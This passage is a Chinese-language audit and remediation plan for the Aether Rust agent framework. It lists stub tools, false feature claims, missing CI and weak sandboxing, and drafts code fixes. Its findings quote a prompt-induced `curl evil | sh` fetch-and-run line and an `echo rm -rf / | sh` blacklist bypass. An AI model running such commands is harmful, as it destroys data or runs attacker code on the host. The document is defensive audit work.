# Aether 代码审计与修复方案

> **版本**：v1.0
> **日期**：2026-06-15
> **状态**：权威方案 — 2026-06-16 执行完成
> **完成度**：30/31 task ✅ | 37 测试通过 | 0 编译错误
> **未完成**：T-4.2（Web SDK 真接 agent-core — 需要抽 HttpClient trait，属于架构重构，已回退所有尝试，待 Opus 研究后确定方案。当前 agent-wasm 使用 agent-core 类型系统 + web_sys::fetch 直调 LLM API，不走 AIAgent ReAct 循环）
> **范围**：Aether 仓库当前 master（`agent-core` / `agent-bindings` / `agent-wasm` / 5 个平台 SDK / docs / CI）
> **审计方法**：17 个独立子代理对抗式审查，覆盖源码、文档、CI、测试、跨平台绑定

---

## 0. 导读

### 这份文档是什么

一份覆盖**审计 + 修复 + 执行**三段的单一权威文档：

| 部分 | 内容 | 给谁 |
|---|---|---|
| **Part I** | 现状审计 — 16 类已识别问题（file:line 证据） | 维护者、决策者 |
| **Part II** | 修复路线图 — 31 个可独立 PR 的任务（带代码草稿与验收） | 贡献者 |
| **Part III** | 执行指南 — PR 模板、度量、守则 | 仓库 owner |
| **Part IV** | 范围管理 — 该砍的功能、不可逾越的约束 | 所有人 |

### 怎么用

1. 先读 Part I（约 30 分钟）— 理解项目当前真实位置
2. 通读 Part II（约 1 小时）— 掌握 31 个任务全貌、优先级、依赖
3. 在 GitHub 为 31 个任务开 31 个 Issue，标签 `T-X.Y`
4. 按 Part III 节奏推进；不符合守则的 PR 不接受
5. **不要跳过阶段 1**：阶段 1 修复的是项目反馈机制，不修这一步后面所有工作都在为旧的错误标签买单

---

# Part I — 现状审计

## 1. 总评

### 1.1 一句话结论

> Aether 是一个清晰的 Trait 骨架 + 一个能跑通 OpenAI 快乐路径的 ReAct 调度器（约 150 行），但 README 宣称的 11 项 "✅ Complete" 能力里 **0 项真正完成**、4 项是会向 LLM 撒谎的桩函数、5 个"已验证"平台 SDK 实际上**没有任何 CI 验证**。
>
> **结论：架构基础合理但当前以"已完成"的姿态对外发布属于明显误导，离生产可用还差约 80%。**

### 1.2 项目的核心矛盾

1. **代码 vs 文档**：README 像完整产品的说明书，代码像第二周的原型
2. **声明 vs 验证**：5 个 SDK 全部标 "Verified"，但 CI 不跑测试、产物不入仓
3. **命名 vs 行为**：`md5_compute` 不是 MD5、`Sub-agent` 是 `format!()` 宏、`Compression` 是日志打印
4. **配置 vs 消费**：[config.rs](../agent-core/src/config.rs) 的 23 个字段里 11 个从未被读取

这不是早期项目常见的乐观主义，是 [docs/devlog.md](devlog.md) 中作者亲自承认过 **"Phase 6-7 之前只写了空壳"** 的反复发生的模式。**这是项目反馈机制层面的失灵**，所以"修代码"之前必须先"修反馈机制"——这就是阶段 1 的目的。

---

## 2. 体量与覆盖度

### 2.1 代码体量对比

| 模块 | Aether 行数 | Hermes 对应 | 实际覆盖率 |
|---|---:|---:|---|
| Agent shell + Loop | 438 | ~9,600 | **~15%**（仅快乐路径，无错误恢复面） |
| 持久化层 | 193 | 4,777 | **~5%**（FTS5 已声明但是死代码） |
| 上下文压缩 | 109 | 2,258 | **~3%**（作者注释"仅记录日志"） |
| MCP 协议 | 200 | client+server+OAuth | **~10%**（stdio call_tool 直接 return Err） |
| 工具系统 | ~1,000 | ~5,000+ | **~20%**（17 个里 9 个真实可用） |
| LLM 适配器 | ~950 | 多 provider | **~35%**（OpenAI 完整；Anthropic 流式直接报错） |

### 2.2 测试数字核对

README 宣称 **52 个测试通过**。实测约 **49 个**，其中：

- 1 个是 `assert!(... || true)` 恒真断言
- 3 个在 CI 缺 Hermes 源码时直接 early-return（变成空操作）
- 19 个 "integration tests" **不构造 AIAgent，不调用 loop**，全是单模块单测
- ReAct 循环、流式、压缩、Review、Curator、MCP **覆盖率：0%**
- **CI 根本不执行 `cargo test`**（见 [.github/workflows/ci.yml](../.github/workflows/ci.yml)）

---

## 3. 声明 vs 现实

README "Features" 表 11 项当前真实状态：

| README 声明 | 真实状态 | 严重度 |
|---|---|---|
| Agent Engine ✅ Complete | 🟡 Partial — 流式无 ReAct 循环；空响应静默吞掉 | 高 |
| Learning Loop ✅ Complete | 🟠 Stub — Curator 从未调度；学到的 skill 全部叫 `auto-learned-skill` | 严重 |
| L1-L4 Memory ✅ Complete | 🟡 Partial — L1+L2 OK；FTS5 是死代码 | 高 |
| Skills System ✅ Complete | ✅ Functional — 最小可用 | — |
| Tool System ✅ (17 tools) | 🟡 9 真 / 3 桩 / 1 Windows-only / 4 部分 | 严重 |
| MCP ✅ Complete | 🟠 Stub — stdio call_tool 必返回 Err；无 server；无 OAuth | 严重 |
| Context Compression ✅ | 🟠 Stub — 作者注释"仅记录日志" | 严重 |
| Streaming ✅ Complete | 🟡 Partial — Anthropic 直接报错；工具调用全丢 | 严重 |
| Profile System ✅ | 🟠 Stub — `active` 硬编码 "default" | 严重 |
| Sub-agent Delegation ✅ | 🟠 Stub — `delegate_batch` 是 `format!()` 宏 | 严重 |
| Platform SDKs ✅ Verified | 🟡 5 个 SDK 无一被 CI 验证；Web SDK 完全绕过 agent-core | 严重 |

**总计：11/11 项 "✅ Complete" 中实际真完成的：1**（Skills System）。

---

## 4. 16 类架构问题（按严重度）

每个问题给出：位置（file:line）→ 现象 → 影响 → 对应修复任务编号。

### 4.1【严重】桩函数被注册进 LLM 工具表，向模型撒谎

**位置**：[extra_tools.rs](../agent-core/src/tools/extra_tools.rs)、[agent.rs:60-79](../agent-core/src/agent.rs#L60)
**现象**：`CronJob` / `ImageGenerate` / `HomeAssistant` 都返回 `{"note":"configure externally"}`，但都被无条件 `register()` 进 `ToolRegistry`。
**影响**：每次对话开始时，工具 schema 都告诉 LLM 它有这些能力，模型听信→调用→拿到空 note→围绕谎言幻觉。这是当前对真实用户伤害最大的一项——污染的是模型输入。
**修复**：→ **T-1.1**

### 4.2【严重】ExecuteCode 文档说"隔离进程"实际在宿主跑

**位置**：[terminal_backends.rs:93-151](../agent-core/src/tools/terminal_backends.rs#L93)
**现象**：文档声称"隔离进程中执行"，实际是 `python -c` / `node -e` / `sh -c` 在宿主进程里跑，只有 `tokio::time::timeout`。
**影响**：若 LLM 被诱导发出 `os.system('curl evil | sh')`，会以 agent 进程权限直接执行——安全 critical 双重误导。
**修复**：→ **T-4.1**

### 4.3【严重】Terminal 工具是 Windows-only，Linux/macOS 整个跑不通

**位置**：[terminal_tool.rs:68-69](../agent-core/src/tools/terminal_tool.rs#L68)
**现象**：硬编码 `cmd /C`。所谓"沙箱"是 [terminal_tool.rs:16-29](../agent-core/src/tools/terminal_tool.rs#L16) 的正则黑名单，`echo rm -rf / | sh` 即可绕过。
**影响**：README 同时宣称 Linux/macOS 支持，连第一个 shell 命令都执行不了。
**修复**：→ **T-2.1**

### 4.4【严重】MCP stdio 调用结构性损坏

**位置**：[mcp/mod.rs:147-166](../agent-core/src/mcp/mod.rs#L147)
**现象**：构造 `json_str` 后**无条件**返回 `Err(McpConnectionError("stdio 调用: 请使用 send_request 方法"))`。其他问题：
- 无 `initialize` 握手 → 真 MCP 服务端会拒 `tools/list`
- [mcp/mod.rs:77-100](../agent-core/src/mcp/mod.rs#L77) 在 `async fn` 内用同步 `std::io::{BufRead, Write}` → 高压下饿死 tokio 运行时
- 子进程 `child` handle 在 `connect_stdio` 后被 drop → 孤儿进程
- 请求 ID 硬编码 `1` 和 `2` → 并发必撞车

**影响**：对 stdio MCP 服务器调用任何工具必定失败。
**修复**：→ **T-2.4**

### 4.5【严重】Compression 是作者亲自注释的死代码

**位置**：[loop_mod.rs:176-178](../agent-core/src/loop_mod.rs#L176)、[compression/mod.rs:92-100](../agent-core/src/compression/mod.rs#L92)
**现象**：作者内联注释 `// 当前简化：仅记录日志，后续迭代不会继续增长`。`compressed` 向量构造完立刻丢弃。`compression_enabled` / `compression_threshold_ratio` 配置字段从未被读取。Token 估算 `text.len()/2` 对 CJK 严重偏差。
**影响**：长对话仍会爆 token；声明的"自动压缩"是假的。
**修复**：→ **T-2.2**

### 4.6【严重】Sub-agent Delegation 是 `format!()` 宏

**位置**：[delegate.rs:39](../agent-core/src/delegate.rs#L39)、[delegate.rs:53](../agent-core/src/delegate.rs#L53)
**现象**：`delegate()` 用 `tools: &[]` 空数组（不是"受限工具集"，是零工具）。`delegate_batch()` 是纯桩：spawned 任务返回 `format!("[任务完成] {}", goal)` ——根本不调 LLM。作者注释承认 `// 简化版`。
**影响**：README 的 "Sub-agent Delegation ✅ Complete" 完全虚假。
**修复**：→ **T-1.6**（截肢）→ **T-3.6**（重写）

### 4.7【严重】Profile 系统静默失败的"隔离"

**位置**：[profile.rs:30-38](../agent-core/src/profile.rs#L30)、[agent.rs:181-183](../agent-core/src/agent.rs#L181)、[config.rs:59](../agent-core/src/config.rs#L59)
**现象**：`ProfileManager::new()` 硬编码 `active: "default".into()`；`AgentConfig.profile` 字段从未被读取。
**影响**：`aether --profile work` 与 `aether --profile prod` 写到同一个 `MEMORY.md`——隔离功能最差失败模式：自称已开启实则未开启。
**修复**：→ **T-1.4** + **T-2.8**

### 4.8【严重】流式 + 工具调用架构不自洽

**位置**：[openai.rs:360](../agent-core/src/llm/openai.rs#L360)、[anthropic.rs:257-265](../agent-core/src/llm/anthropic.rs#L257)、[agent.rs:192-216](../agent-core/src/agent.rs#L192)
**现象**：
- OpenAI 流式硬编码 `tool_calls: None`，所有 SSE 工具增量被丢弃
- Anthropic 流式直接返回 `Err(UnsupportedApiMode("Anthropic 流式尚未实现"))`
- `chat_stream` 是单次 LLM 调用，**没有 ReAct 循环**

**影响**：流式模式在任何 provider 上都无法使用工具——Trait 表面广告了实现交付不了的能力。
**修复**：→ **T-3.1** + **T-3.2** + **T-3.3**

### 4.9【高】持久化层声明 Hermes 兼容但破坏数据

**位置**：[state.rs:33](../agent-core/src/memory/state.rs#L33)、[state.rs:148](../agent-core/src/memory/state.rs#L148)、[state.rs:125-131](../agent-core/src/memory/state.rs#L125)
**现象**：
- 声明 `messages_fts USING fts5(...)` 但**没有触发器**保持同步
- `search_sessions` 用 `LIKE '%...%'`，**完全不是 MATCH** —— FTS5 是装饰品
- `load_session` 把 `tool_calls` 读到 `_tc` 然后**丢弃**

**影响**：回放任何会话都丢失所有工具调用；声称"drop-in 替换 Hermes"但读会话即损毁数据。
**修复**：→ **T-2.3**

### 4.10【高】Cross-layer Wiring 失败：配置成为装饰

**位置**：[config.rs](../agent-core/src/config.rs) 全文
**现象**：23 个字段里 **11 个从未被读取**：`enabled_toolsets`, `disabled_toolsets`, `memory_enabled`, `compression_enabled`, `compression_threshold_ratio`, `skills_enabled`, `delegation_enabled`, `max_concurrent_children`, `max_spawn_depth`, `session_id`, `profile`, `log_level`。
**影响**：架构层面配置面与执行面解耦。系统有一种"虚构的维度"。
**修复**：→ **T-2.5**

### 4.11【高】Naming Lies —— 把愿景刻进函数名

**位置**：多处
- [breaker.rs:47-52](../agent-core/src/breaker.rs#L47) `md5_compute` 用 `DefaultHasher`（SipHash），**不是 MD5**，跨进程随机种子结果不一样
- [prompt.rs:9-32](../agent-core/src/prompt.rs#L9) "三层结构" 实际是 `Vec::join("\n")`；"stable" 层烤入 `chrono::Local::now()` —— 任何缓存目的都被打穿
- [context.rs](../agent-core/src/context.rs) "ContextEngine" 是 `ls -R | head` + `date`，循环开始时调一次后从不再注入
- [review.rs:88-118](../agent-core/src/memory/review.rs#L88) "后台 Review 子代理"复用父代理 model handle，无受限工具集、无独立上下文、无预算
- [review.rs:111-114](../agent-core/src/memory/review.rs#L111) 每个学到的 skill frontmatter 都叫 `name: auto-learned-skill` —— 逻辑名字必然碰撞

**影响**：reader 无法从函数名判断实际行为；prompt cache 命中率永远 0。
**修复**：→ **T-1.7**（改名）+ **T-2.7**（行为修复）+ **T-3.4**（真子代理）

### 4.12【高】构建系统三处显式坏掉

**位置**：
- [agent-bindings/src/lib.rs:5](../agent-bindings/src/lib.rs#L5) `pub mod uniffi_sdk;` 指向不存在的文件 → `cargo build --features uniffi` 报错
- [agent-bindings/Cargo.toml:37](../agent-bindings/Cargo.toml#L37) `required-features = ["cli"]` 但 `[features]` 没声明 `cli` → `cargo build --bin aether` 报错
- [agent-bindings/src/lib.rs:15](../agent-bindings/src/lib.rs#L15) `use agent_core::AIAgent;` 无条件，但 `AIAgent` 被 `cfg(feature="native")` 守卫 → `--no-default-features --features wasm` 编译失败

**影响**：三套 FFI 路径全坏。
**修复**：→ **T-1.5**

### 4.13【高】安全姿态是化妆品

**位置**：
- [file_tools.rs:8-23](../agent-core/src/tools/file_tools.rs#L8) `secure_path` 纯字面量检查 (`contains("..")`)，不 `canonicalize()` —— 符号链接可越狱
- [web_tools.rs:7-55](../agent-core/src/tools/web_tools.rs#L7) SSRF 防御是小写后字串 `contains`，不解析 URL、不处理 IDN/十进制/十六进制 IP/`0.0.0.0`；`WebSearch` 完全跳过该防御
- [memory_tool.rs:63-69](../agent-core/src/tools/memory_tool.rs#L63) 把 LLM 输出原始文本永久追加到 `MEMORY.md`，无去重、无上限、无 secret 脱敏
- [openai.rs:229](../agent-core/src/llm/openai.rs#L229) `&text[..text.len().min(200)]` 可能切在 UTF-8 边界 → 非 ASCII 错误体 panic

**影响**：项目不能接触任何不可信输入；secret 可能进入 memory 文件长期保存。
**修复**：→ **T-2.6** + **T-3.7** + **T-3.8** + **T-3.9**

### 4.14【高】平台 SDK 五连"已验证"实际全无 CI

| 平台 | README 标签 | 实际状态 |
|---|---|---|
| Android | ✅ Verified | `sdks/android/src/main/jniLibs/` **不在仓库**；`.so` 由外部脚本产出；CI 不跑 |
| iOS | 中英 README 自相矛盾 | xcframework 不在仓库；无 macOS CI |
| Windows | ✅ Verified | `agent_bindings.dll` 不在仓库；**无 Windows CI**；用 `Marshal.PtrToStringAnsi` 读 UTF-8 → 中文回复必乱码 |
| Web | ✅ Verified | [agent-wasm/src/lib.rs](../agent-wasm/src/lib.rs) **根本不调** `agent_core::AIAgent`，只是 `web_sys::fetch` 包了一个 `/chat/completions` POST。"Web SDK" 是 587KB 的 fetch wrapper，**不是 agent** |
| Python | 隐含 ✅ | `libuniffi.so` 不在包内；`pyproject.toml` 无 `package_data` / `cibuildwheel` → `import aether` OSError |

所有 SDK 实际暴露的公共 API 只有 `{construct, init_model, chat(string) → string, destroy}`。**没有流式、没有工具、没有记忆、没有 skills、没有 MCP** —— agent-core 那 11 项 "✅ Complete" 的能力在任何 SDK 里都不可达。
**修复**：→ **T-4.2** + **T-4.3** + **T-4.4** + **T-4.5** + **T-4.6**

### 4.15【高】CI 与 README 直接矛盾

**位置**：[.github/workflows/ci.yml](../.github/workflows/ci.yml)（52 行）
**现象**：3 个 job：
1. `build-and-test`（注释写"编译 + 测试"，**实际只跑 `cargo build`**）
2. `cross-android`（只编 `agent-core`，**不编 `agent-bindings`**）
3. `cross-wasm`（只编 `agent-core`，**不编 `agent-wasm`**）

**没有 Windows job，没有 macOS job，没有测试 job**。
**影响**：README 宣称的 `test-linux/windows/macos + cross-android + cross-wasm` 与事实直接相悖。
**修复**：→ **T-1.3**

### 4.16【中】文档内部互相打脸

| 事项 | 英文 README | 中文 README | tasks.md | devlog.md |
|---|---|---|---|---|
| crates.io | ❌ TODO | 🚧 未发布 | ✅ 元数据就绪 | 未提 |
| iOS SDK | 🚧 | ✅ Swift SDK | ✅ 完成 | 未实际验证 |
| Web SDK | ✅ Verified | ✅ WASM (coming) | ✅ 完成 | 一度"回退所有修改" |

[devlog.md](devlog.md) 中有这样的条目：**"Phase 6-7 补全真实实现：之前 Phase 6-7 只写了空壳，现在补全了"** —— 作者亲自承认曾以"完成"姿态发布空壳。
**修复**：→ **T-1.2**

---

# Part II — 修复路线图

## 5. 总体策略

### 5.1 四个阶段

| 阶段 | 主题 | 任务数 | 一人耗时 | 三人耗时 | 完成后 |
|---|---|---|---|---|---|
| **阶段 1** | 止血 + 信任修复 | 7 | 1 周 | 2 天 | 仓库不再撒谎；README/CI 与代码对齐 |
| **阶段 2** | 补完已存在的接线 | 9 | 2-3 周 | 1 周 | 6/11 项 README 能力可真打钩 |
| **阶段 3** | 真功能（流式工具/真子代理/安全） | 9 | 4-6 周 | 2 周 | 可与 Hermes 功能清单正式比对 |
| **阶段 4** | 跨平台真验证 | 6 | 6-8 周 | 3 周 | "Verified" 标签首次有真实含义 |

**总工时**：1 人 ~5-7 个月；3 人 ~2-2.5 个月。

### 5.2 任务格式

```
### T-X.Y  <一句话标题>         [工时] [风险] [依赖]
问题：file:line 证据
改法：步骤 + 代码草稿
验收：可勾选 checkbox
```

风险等级：
- **低**：纯删除/重命名/补 cfg 守卫，不可能破坏既有调用方
- **中**：改变内部行为，但公共 API 不变
- **高**：改变公共 API 或核心控制流

### 5.3 强制前置条件

**阶段 1 必须先完成全部 7 个 task，再开任何阶段 2 PR**。阶段 1 修的是项目反馈机制，不修这一步后面的工作都在为旧的错误标签买单。

---

## 6. 阶段 1 — 止血 + 信任修复（~1 周）

> 目标：让仓库**说真话**。这阶段不增加任何能力，只是让代码与文档对齐。
> 衡量：陌生人 clone 后照 README 走一遍，不会被任何 "✅ Complete" 骗到。

---

### T-1.1  从 ToolRegistry 删除桩工具                              [0.5 天] [低] [无]

**问题**
[extra_tools.rs](../agent-core/src/tools/extra_tools.rs) 中的 `CronJob` / `ImageGenerate` / `HomeAssistant` 实现是 `Ok(json!({"note":"configure externally"}))` 桩；但 [agent.rs:60-79](../agent-core/src/agent.rs#L60) 把它们无条件 `register()`。每次对话都向 LLM 撒谎。

**改法**

```rust
// agent-core/src/agent.rs:60-79
// 删除这三行：
//   registry.register(Arc::new(CronJob));
//   registry.register(Arc::new(ImageGenerate));
//   registry.register(Arc::new(HomeAssistant));
//
// 同时把 extra_tools.rs 中这三个结构体移到 #[cfg(feature = "experimental_stubs")]
// 之下，作为占位保留但默认 feature 不再编译。
```

```toml
# agent-core/Cargo.toml
[features]
experimental_stubs = []  # 仅用于开发/演示，不会暴露给 LLM
```

**验收**
- [ ] `cargo run -- chat "list your tools"` 输出不再包含 cron/image/homeassistant
- [ ] `grep -rn "CronJob\|ImageGenerate\|HomeAssistant" agent-core/src/` 只剩 `extra_tools.rs` 一处定义
- [ ] README "Tool System: 17 built-in tools" 改为 "Tool System: 9 built-in tools"

---

### T-1.2  README / docs 全面去虚假化                             [0.5 天] [低] [无]

**问题**
README "Features" 表 11 项全标 ✅ Complete；devlog.md 自承"空壳"；中英 README iOS 状态矛盾。

**改法**

引入四档 status 标签，统一使用：

| 标签 | 含义 |
|---|---|
| ✅ Functional | 公开 API 工作、有测试覆盖、CI 验证 |
| 🟡 Partial | 主路径工作但部分子能力缺失（必须列出缺失项）|
| 🟠 Stub | 接口存在但行为为空/占位 |
| 🚧 Planned | 仅有规划，无代码 |

按 §3 的真值表把 11 项重新打标。同时统一中英 README 的 iOS/Windows/Web 状态。

**验收**
- [ ] `grep -c "✅ Complete" README.md README.zh-CN.md` 输出 0
- [ ] 中英 README 状态表逐行一致
- [ ] 任何 status 标签后跟具体缺失项（不允许只标 🟡 不说缺什么）

---

### T-1.3  CI 真跑 cargo test + Windows/macOS job                  [0.5 天] [低] [无]

**问题**
[.github/workflows/ci.yml](../.github/workflows/ci.yml) 注释写"编译 + 测试"实际只跑 `cargo build`。无 Windows/macOS job。

**改法**

```yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  test:
    strategy:
      fail-fast: false
      matrix: { os: [ubuntu-latest, windows-latest, macos-latest] }
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo build --workspace --all-targets
      - run: cargo test --workspace --all-targets

  cross-android:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
        with: { targets: aarch64-linux-android }
      - run: cargo build -p agent-core --target aarch64-linux-android --no-default-features --features native
      - run: cargo build -p agent-bindings --target aarch64-linux-android --features uniffi

  cross-wasm:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
        with: { targets: wasm32-unknown-unknown }
      - run: cargo build -p agent-core --target wasm32-unknown-unknown --no-default-features
      - run: cargo build -p agent-wasm --target wasm32-unknown-unknown
```

⚠️ **预期副作用**：windows/macos job 第一次跑会爆出真实问题（T-2.1、T-2.6）。**这是预期收益**。

**验收**
- [ ] CI 在 3 个 OS 跑 `cargo test --workspace`
- [ ] 跨编译 job 同时覆盖 `agent-core` 和它的 binding 包装
- [ ] PR 模板里加 "若修改 src/，必须 CI 全绿"

---

### T-1.4  Profile 硬编码 default 修复                             [0.5 天] [低] [无]

**问题**
[profile.rs:30-38](../agent-core/src/profile.rs#L30) 硬编码 `active: "default".into()`。`AgentConfig.profile` 字段从未被消费。

**改法**

```rust
// agent-core/src/profile.rs
impl ProfileManager {
    pub fn new(active: Option<String>) -> Self {
        Self { active: active.unwrap_or_else(|| "default".into()) }
    }

    pub fn home(&self) -> PathBuf {
        let base = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."))
            .join(".aether").join("profiles").join(&self.active);
        let _ = std::fs::create_dir_all(&base);
        base
    }
}

// agent-core/src/agent.rs:181-183
let profile = ProfileManager::new(config.profile.clone());
let home = profile.home();
let memory = MemoryCore::open(home.join("MEMORY.md"), home.join("USER.md"))?;
let store  = SessionStore::open(home.join("sessions.db"))?;
```

**验收**
- [ ] `aether --profile work chat "..."` 与 `--profile prod chat "..."` 写到不同目录
- [ ] 单测 `profile::isolation`：两个 ProfileManager 写两份 MEMORY.md，互不可见

---

### T-1.5  修复 agent-bindings 三处构建坏                          [0.5 天] [低] [无]

**问题**
三处直接 build 失败（见 §4.12）。

**改法**

```rust
// agent-bindings/src/lib.rs
#[cfg(feature = "uniffi")]
pub mod uniffi_sdk;       // 同时把磁盘文件 src/uniffi.rs 改名为 src/uniffi_sdk.rs

#[cfg(feature = "wasm")]
pub mod wasm;

#[cfg(feature = "native")]
use agent_core::AIAgent;
```

```toml
# agent-bindings/Cargo.toml
[features]
default = ["native"]
native  = ["agent-core/native"]
cli     = ["native"]
uniffi  = ["dep:uniffi"]
wasm    = ["wasm-bindgen", "serde-wasm-bindgen", "js-sys"]
```

**验收**
- [ ] `cargo build --features uniffi` 通过
- [ ] `cargo build --bin aether` 通过
- [ ] `cargo build --no-default-features --features wasm` 通过

---

### T-1.6  删除 delegate_batch；delegate() 改名 subquery_llm        [0.5 天] [低] [无]

**问题**
[delegate.rs:39](../agent-core/src/delegate.rs#L39) `delegate()` 用 `tools: &[]`；`delegate_batch()` 是 `format!("[任务完成] {}", goal)` 桩。

**改法**

```rust
// agent-core/src/delegate.rs
/// 用辅助模型做一次性问答。**不是 sub-agent**：无工具、无循环、无记忆。
/// 真正子 agent 见 T-3.6。
pub async fn subquery_llm(model: &dyn ChatModel, goal: &str) -> Result<String, AetherError> {
    let msgs = vec![Message::user(goal)];
    let resp = model.chat(&msgs, &[]).await?;
    resp.content.ok_or(AetherError::EmptyResponse)
}
```

删除 `delegate_batch`。README "Sub-agent Delegation" 改 🚧 Planned。

**验收**
- [ ] `delegate_batch` 在公开 API 中不存在
- [ ] `grep "format!.*任务完成"` 无结果

---

### T-1.7  Naming 改造（不改行为，只改名字+文档）                   [0.5 天] [低] [无]

**问题**
多处函数名与实际行为不符（见 §4.11）。

**改法**

| 旧名 | 新名 |
|---|---|
| `md5_compute` | `signature_hash`（注释 SipHash 不跨进程稳定）|
| `PromptLayers::{stable,contextual,volatile}` | `PromptParts::{lines}`（标记 TODO: T-2.7）|
| `ContextEngine` | `WorkdirSnapshot`（标记 TODO: T-2.7）|
| `BackgroundReview` docstring | 加 "**这不是 sub-agent**，是 post-turn LLM reflection。真 sub-agent 在 T-3.4" |

**验收**
- [ ] `grep "md5" agent-core/src/` 仅在测试/注释里
- [ ] 重命名后单元测试全绿
- [ ] 每个改名处的 docstring 提到对应 T-X.Y 任务

---

## 7. 阶段 2 — 补完已存在的接线（~2-3 周）

> 目标：让已经声明但只接了一半的代码路径**真的被消费**。不引入新概念。

---

### T-2.1  Terminal 工具跨平台修复                                 [1 天] [中] [无]

**问题**
[terminal_tool.rs:68-69](../agent-core/src/tools/terminal_tool.rs#L68) 硬编码 `cmd /C`。

**改法**

```rust
fn shell_invocation(cmd: &str) -> (PathBuf, Vec<String>) {
    if cfg!(windows) {
        (PathBuf::from("cmd"), vec!["/C".into(), cmd.into()])
    } else {
        let sh = which::which("bash").or_else(|_| which::which("sh"))
            .unwrap_or_else(|_| PathBuf::from("/bin/sh"));
        (sh, vec!["-c".into(), cmd.into()])
    }
}
```

**验收**
- [ ] 测试在 ubuntu/windows/macos 三个 job 全部通过
- [ ] Terminal schema 加 "shell-dependent: bash/sh on *nix, cmd on Windows"

---

### T-2.2  Compression 真消费 compressed 向量                       [1 天] [中] [无]

**问题**
[loop_mod.rs:176-178](../agent-core/src/loop_mod.rs#L176) 作者注释 `// 仅记录日志`；compressed 向量构造完丢弃。

**改法**

```rust
// agent-core/src/compression/mod.rs
pub struct CompressionOutcome {
    pub compressed_messages: Vec<Message>,
    pub original_token_estimate: usize,
    pub new_token_estimate: usize,
}

pub async fn maybe_compress(
    cfg: &AgentConfig, messages: &mut Vec<Message>, aux_model: &dyn ChatModel,
) -> Result<Option<CompressionOutcome>, AetherError> {
    if !cfg.compression_enabled { return Ok(None); }
    let est = estimate_tokens(messages);
    let cap = cfg.compression_threshold_ratio * cfg.context_window_tokens as f32;
    if (est as f32) < cap { return Ok(None); }
    let outcome = run_compression(messages, aux_model).await?;
    *messages = outcome.compressed_messages.clone();
    Ok(Some(outcome))
}

// agent-core/src/loop_mod.rs
if let Some(outcome) = compression::maybe_compress(&self.config, &mut messages, aux).await? {
    tracing::info!(original = outcome.original_token_estimate, new = outcome.new_token_estimate, "compressed");
    budget.refund_one();
}
```

Token 估算改为 CJK 友好（CJK 字符按 1 token、ASCII 按 4 字符 1 token），或集成 `tiktoken-rs`。

**验收**
- [ ] 单测：100 条长消息 → `maybe_compress` 返回 `Some`，压缩后 `messages.len() < 100`
- [ ] `compression_enabled = false` 时 early return `None`
- [ ] "仅记录日志"注释删除

---

### T-2.3  持久化层：tool_calls round-trip + FTS5 真触发器           [2 天] [高] [T-1.2]

**问题**
[state.rs:125-131](../agent-core/src/memory/state.rs#L125) `tool_calls` 读到 `_tc` 丢弃；FTS5 无触发器；`search_sessions` 用 LIKE。

**改法**

```rust
const SCHEMA: &str = r#"
CREATE TABLE IF NOT EXISTS messages (
    id INTEGER PRIMARY KEY,
    session_id TEXT NOT NULL,
    role TEXT NOT NULL,
    content TEXT,
    tool_calls TEXT,
    tool_call_id TEXT,
    created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_msgs_session ON messages(session_id);

CREATE VIRTUAL TABLE IF NOT EXISTS messages_fts USING fts5(
    content, tool_calls, session_id UNINDEXED,
    content='messages', content_rowid='id'
);

CREATE TRIGGER IF NOT EXISTS messages_ai AFTER INSERT ON messages BEGIN
    INSERT INTO messages_fts(rowid, content, tool_calls, session_id)
    VALUES (new.id, new.content, new.tool_calls, new.session_id);
END;
CREATE TRIGGER IF NOT EXISTS messages_ad AFTER DELETE ON messages BEGIN
    INSERT INTO messages_fts(messages_fts, rowid, content, tool_calls, session_id)
    VALUES ('delete', old.id, old.content, old.tool_calls, old.session_id);
END;
CREATE TRIGGER IF NOT EXISTS messages_au AFTER UPDATE ON messages BEGIN
    INSERT INTO messages_fts(messages_fts, rowid, content, tool_calls, session_id)
    VALUES ('delete', old.id, old.content, old.tool_calls, old.session_id);
    INSERT INTO messages_fts(rowid, content, tool_calls, session_id)
    VALUES (new.id, new.content, new.tool_calls, new.session_id);
END;
"#;

fn row_to_message(row: &Row) -> rusqlite::Result<Message> {
    let role: String = row.get("role")?;
    let content: Option<String> = row.get("content")?;
    let tc_json: Option<String> = row.get("tool_calls")?;
    let tool_calls = tc_json.and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_default();
    Ok(Message { role: role.parse()?, content, tool_calls, .. })
}

pub fn search_sessions(&self, q: &str, limit: usize) -> Result<Vec<SearchHit>> {
    let mut stmt = self.conn.prepare(
        "SELECT session_id, content, bm25(messages_fts) AS score
         FROM messages_fts WHERE messages_fts MATCH ? ORDER BY score LIMIT ?")?;
    // ...
}
```

Hermes 兼容性补充：跑迁移脚本从真实 Hermes SQLite 读 100 条会话写到 Aether 库再读回比对，加入 `agent-core/tests/hermes_compat.rs`。

**验收**
- [ ] 单测 `state::tool_calls_round_trip`：save → load → 比对 tool_calls
- [ ] 单测 `state::fts_search_matches`：写 10 条，`search_sessions("phrase")` 返回正确 rowid
- [ ] Hermes 兼容测试不丢字段

---

### T-2.4  MCP stdio 真正能 call_tool                              [3 天] [高] [无]

**问题**
见 §4.4，stdio call_tool 无条件 Err；无 initialize；同步 io；孤儿进程；id 撞车。

**改法**

```rust
// agent-core/src/mcp/stdio.rs
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, ChildStdin, Command};
use tokio::sync::{oneshot, Mutex};
use std::sync::atomic::{AtomicU64, Ordering};

pub struct McpStdio {
    child: Child,                    // drop = kill 子进程
    stdin: Mutex<ChildStdin>,
    next_id: AtomicU64,
    pending: Mutex<HashMap<u64, oneshot::Sender<serde_json::Value>>>,
}

impl McpStdio {
    pub async fn connect(cmd: &[String]) -> Result<Self, AetherError> {
        let mut child = Command::new(&cmd[0]).args(&cmd[1..])
            .stdin(Stdio::piped()).stdout(Stdio::piped()).spawn()?;
        let stdin = child.stdin.take().unwrap();
        let stdout = child.stdout.take().unwrap();

        let server = Self { child, stdin: Mutex::new(stdin),
                            next_id: AtomicU64::new(1), pending: Mutex::new(HashMap::new()) };

